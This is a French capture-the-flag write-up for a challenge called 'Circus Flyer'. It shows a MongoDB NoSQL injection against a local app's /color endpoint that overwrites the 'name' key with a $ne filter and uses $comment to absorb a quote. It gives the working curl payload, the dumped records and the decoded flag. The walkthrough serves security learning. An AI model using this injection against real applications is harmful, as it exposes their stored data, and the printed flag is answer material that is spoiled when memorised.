# Circus Flyer

## Write-up

En visitant le site, on remarque des boutons permettant de changer les couleurs de la page.

En regardant le code source, on remarque qu'une requête est faite au serveur pour récupérer les couleurs, et on peut voir qu'un objet est retourné.

```json
{
    "_id": "66aaa2488bebc41cd65f143b",
    "name": "circus-red",
    "hex": "#FF4500"
}
```

La clé `_id` fait penser à MongoDB, on peut donc essayer de faire une injection.

On voit que la requête est au format `/color?name=...` et que le code en JavaScript s'attend à recevoir un tableau.

On pourrait donc imaginer un filtre pour récupérer toutes les couleurs :

```sh
# /color?name={"$ne":null}
/color?name=%7B"ne":null%7D
```

Sauf que cela nous donne une erreur. En analysant les données que l'on envoie, on remarque que l'on envoie une chaîne de caractères, ce qui suggère que le serveur ajoute des guillemets autour de notre chaîne.

Le serveur construit donc un filtre ayant le format suivant :

```
{ "name": "$notre_filtre" }
```

Comme on construit un objet, il est possible d'écraser une clé en envoyant un objet avec la même clé.

Nous aurions donc ceci :

```sh
# /color?name=","name":"{"$ne":null}"
# /color?name=","name":%7B"$ne":null%7D
{  "name": "", "name": { "$ne": null }" }
```

Le problème est qu'il nous reste un guillemet à fermer. Il nous faudrait un champ simple qu'on peut ajouter qui ne dénaturerait pas la requête.

Pour cela, on peut chercher dans la [liste des opérations supportées](https://www.mongodb.com/docs/manual/reference/operator/query/) par MongoDB pour une requête.

On trouve "$comment" qui n'a aucun effet sur la requête, nous l'utilisons pour "consommer" le guillemet fermant.

```sh 
# /color?name=","name":"{"$ne":null}","$comment":""
# /color?name=","name":%7B"$ne":null%7D,"$comment":"
{ "name": "", "name": { "$ne": null }, "$comment": "" }
```

On peut donc récupérer toutes les couleurs en envoyant cette requête :

```sh
$ curl 'http://localhost:3000/color?name=","name":%7B"$ne":null%7D,"$comment":"' | jq
```

Résultat:

```json
[
  {
    "_id": "66aaa2488bebc41cd65f143b",
    "name": "circus-red",
    "hex": "#FF4500"
  },
  {
    "_id": "66aaa2488bebc41cd65f143c",
    "name": "clown-nose-red",
    "hex": "#DC143C"
  },
  {
    "_id": "66aaa2488bebc41cd65f143d",
    "name": "tent-yellow",
    "hex": "#FFD700"
  },
  {
    "_id": "66aaa2488bebc41cd65f143e",
    "name": "ringmaster-blue",
    "hex": "#1E90FF"
  },
  {
    "_id": "66aaa2488bebc41cd65f143f",
    "name": "acrobatic-purple",
    "hex": "#8A2BE2"
  },
  {
    "_id": "66aaa2488bebc41cd65f1440",
    "name": "performer-pink",
    "hex": "#FF69B4"
  },
  {
    "_id": "66aaa2488bebc41cd65f1441",
    "name": "elephant-gray",
    "hex": "#A9A9A9"
  },
  {
    "_id": "66aaa2488bebc41cd65f1442",
    "name": "lion-mane-orange",
    "hex": "#FFA500"
  },
  {
    "_id": "66aaa2488bebc41cd65f1443",
    "name": "juggler-green",
    "hex": "#32CD32"
  },
  {
    "_id": "66aaa2488bebc41cd65f1444",
    "name": "tightrope-turquoise",
    "hex": "#40E0D0"
  },
  {
    "_id": "66aaa2488bebc41cd65f1445",
    "name": "LgpPkEpSo3",
    "hex": "synt-zbatbvffbzntvp"
  }
]
```

On remarque `synt-...` dans un hex, ce qui est un rot-13. On peut donc le décoder et retrouver le flag.

## Flag

`flag-mongoissomagic`

